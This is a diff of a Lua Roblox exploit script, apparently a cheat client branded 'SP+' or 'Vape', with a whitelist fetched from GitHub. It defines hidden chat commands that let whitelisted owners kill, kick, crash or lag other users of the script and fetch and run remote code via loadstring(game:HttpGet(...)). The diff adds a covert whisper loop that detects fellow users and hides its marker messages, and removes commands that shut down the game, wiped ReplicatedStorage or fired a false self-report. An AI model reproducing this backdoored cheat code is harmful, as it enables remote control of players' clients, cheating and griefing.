@@ -64,43 +64,66 @@ function CanAttackUser(u)
 	return getLplrType() >= userType
 end
 
+local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/ProReleased"))
+local function getLplrType()
+	local lplr_Type = 0
+	if whitelist["Owner"] ~= nil then
+		for i,v in pairs(whitelist["Owner"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 3
+				return lplr_Type
+			end
+		end
+	end
+	if whitelist["Private"] ~= nil then
+		for i,v in pairs(whitelist["Private"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 1
+				return lplr_Type
+			end
+		end
+	end
+	return lplr_Type
+end
+
+local MoonUsers = {}
+
+function CanAttackUser(u)
+	local userId = tostring(u.UserId)
+	local userType = 0
+
+	if whitelist["Private"] ~= nil then
+		for i, v in pairs(whitelist["Private"]) do
+			if v.id == userId then
+				userType = 1
+				break
+			end
+		end
+	end
+
+	if whitelist["Owner"] ~= nil then
+		for i, v in pairs(whitelist["Owner"]) do
+			if v.id == userId then
+				userType = 3
+				break
+			end
+		end
+	end
+
+	return getLplrType() >= userType
+end
+
 local commands = {
 	[".k"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local filename = ""
-			local ScreenGui = Instance.new("ScreenGui")
-			ScreenGui.IgnoreGuiInset = true
-			ScreenGui.Parent = game:GetService("CoreGui")
-
-			local video = Instance.new("VideoFrame")
-			video.Size = UDim2.new(1, 0, 1, 0)
-			video.Parent = ScreenGui
-
-			local Name = filename .. ""
-			if not isfile(Name) then
-				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ""))
-			end
-
-			video.Video = syn and getsynasset(Name) or getcustomasset(Name)
-
-			repeat
-				task.wait()
-				print("")
-			until video.Loaded
-
-			video:Play()
-		end
-	end,
 	[".show"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Easy")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("SP+")
 		end
 	end,
 	[".void"] = function()
@@ -115,21 +138,6 @@ local commands = {
 			end
 		end
 	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local blur = Instance.new("BlurEffect")
-			blur.Size = 10000000000000
-			blur.Parent = game.Lighting
-		end
-	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
-			if blur then
-				blur:Destroy()
-			end
-		end
-	end,
 	[".troll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
@@ -139,15 +147,8 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("Easy")
+				player:Kick("SP+")
 			end
-		end
-	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local rs = game:GetService("ReplicatedStorage")
-			local remote = rs:FindFirstChild("SelfReport", true)
-			remote:FireServer("injection_detected")
 		end
 	end,
 	[".rick"] = function()
@@ -165,16 +166,6 @@ local commands = {
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
-	[".lobby"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
-		end
-	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			game:Shutdown()
-		end
-	end,
 	[".lagback"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			for i = 1, 10 do
@@ -188,41 +179,7 @@ local commands = {
 			end
 		end
 	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			pcall(function()
-				local replicatedStorage = game:GetService("ReplicatedStorage")
-				for _, child in ipairs(replicatedStorage:GetDescendants()) do
-					child:Destroy()
-				end
-			end)
-		end
-	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local function unanchorParts(object)
-				if object:IsA("BasePart") then
-					object.Anchored = false
-				end
-				for _, child in ipairs(object:GetChildren()) do
-					unanchorParts(child)
-				end
-			end
-			unanchorParts(workspace)
-		end
-	end,
 	[".crash"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			while true do end
-		end
-	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local thingy = settings().Network
-			thingy.IncomingReplicationLag = math.huge
-		end
-	end,
-	[".lag"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
 			local RunService = game:GetService("RunService")
 			local player = game.Players.LocalPlayer
@@ -242,16 +199,11 @@ local commands = {
 	end,
 	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			_G.loopkill = true;
-			while _G.loopkill == true do
-				lplr.Character.PrimaryPart.CFrame -= Vector3.new(0,-1000,0)
-				task.wait(.3)
-			end
-		end
-	end,
-	[""] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = false;
+			while _G.loopkill do
+				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
+				wait(3)			
+			end
 		end
 	end
 }
@@ -261,14 +213,52 @@ function isPlayerAllowed()
 end
 
 local txt = game:GetService("TextChatService")
+local private = {}
+local users = {}
+
+task.spawn(function()
+	repeat task.wait()
+		for i,plr in pairs(game.Players:GetPlayers()) do 
+			if table.find(private,plr) then return end
+			if not CanAttackUser(plr) then
+				local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+				local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
+				newchannel:SendAsync("ALAAZA")
+				table.insert(private,plr)
+				task.wait(1)
+				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+			end
+		end
+	until false
+end)
+
+local users = {}
 
 txt.OnIncomingMessage = function(msg)
 	local p = Instance.new("TextChatMessageProperties")
 	local message = msg
 	if msg.TextSource then
+		local plr2
 		local userId = tostring(msg.TextSource.UserId)
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if tostring(v.UserId) == userId then
+				plr2 = v
+				break
+			end
+		end
+		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
+		if CanAttackUser(plr2) and plr2 ~= lplr then
+			if message.Text:find("ALAAZA") then
+				warningNotification("Vape",plr2.Name.." Is Using SP+",60)
+				table.insert(users,plr2.UserId)
+			end
+		end
+		if message.Text:find("ALAAZA") or message.Text:lower():find("privately") then
+			p.PrefixText = ""
+			return p
+		end
 		for i,v in pairs(commands) do
-			if tostring(i) == tostring(message.Text) then
+			if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
 				local plr
 				for i,v in pairs(game.Players:GetPlayers()) do
 					if tostring(v.UserId) == userId then
@@ -283,11 +273,6 @@ txt.OnIncomingMessage = function(msg)
 				break
 			end
 		end
-		p.PrefixText = msg.PrefixText
-		print(message.Text,":",userId)
-
-		local userType = 0
-		local hasTag = false
 		local colors = {
 			["red"] = "#ff0000",
 			["orange"] = "#ff7800",
@@ -299,12 +284,54 @@ txt.OnIncomingMessage = function(msg)
 			["black"] = "#000000",
 			["white"] = "#ffffff",
 		}
+		if CanAttackUser(plr2) and plr2 ~= lplr then
+			if message.Text:find("ALAAZA") then
+				warningNotification("Vape",plr2.Name.." Is Using SP+",60)
+				table.insert(users,plr2.UserId)
+				table.insert(whitelist["tags"],{
+					userid = plr2.UserId,
+					color = "yellow",
+					tag = "SP+ USER"
+				})
+			end
+		end
+		if message.Text:lower():find("alaaza") or message.Text:lower():find("you are now privately chatting") then 
+			p.PrefixText = ""
+			msg.Text = ""
+			return p
+		end
+		for i,v in pairs(commands) do
+			if tostring(i) == tostring(message.Text) then
+				local plr
+				for i,v in pairs(game.Players:GetPlayers()) do
+					if tostring(v.UserId) == userId then
+						plr = v
+						break
+					end
+				end
+				if plr == nil or plr == lplr then break end
+				if not CanAttackUser(plr) then
+					v()
+				end
+				break
+			end
+		end
+		p.PrefixText = msg.PrefixText
+		print(message.Text,":",userId)
+
+		local userType = 0
+		local hasTag = false
+		if users[plr2.UserId] ~= nil then
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[SP+ USER]</font> " .. msg.PrefixText
+			hasTag = true
+			return p
+		end
+
 		if whitelist["tags"] ~= nil then
 			for i, v in pairs(whitelist["tags"]) do
 				if v.userid == userId then
-
 					hasTag = true
-					local color = colors[v.color] or colors["white"]
+					local color = colors[v.color] or colors["pink"]
 					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
 				end
 			end
@@ -315,7 +342,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[Snoopy]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[SP+]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -327,7 +354,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#b800b8'>[VAPE PRIVATE]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ff00ff'>[SP+ OWNER💜]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
@@ -339,7 +366,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[Snoopy]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[SP+]</font> " .. msg.PrefixText
 					end
 					userType = 2
 				end
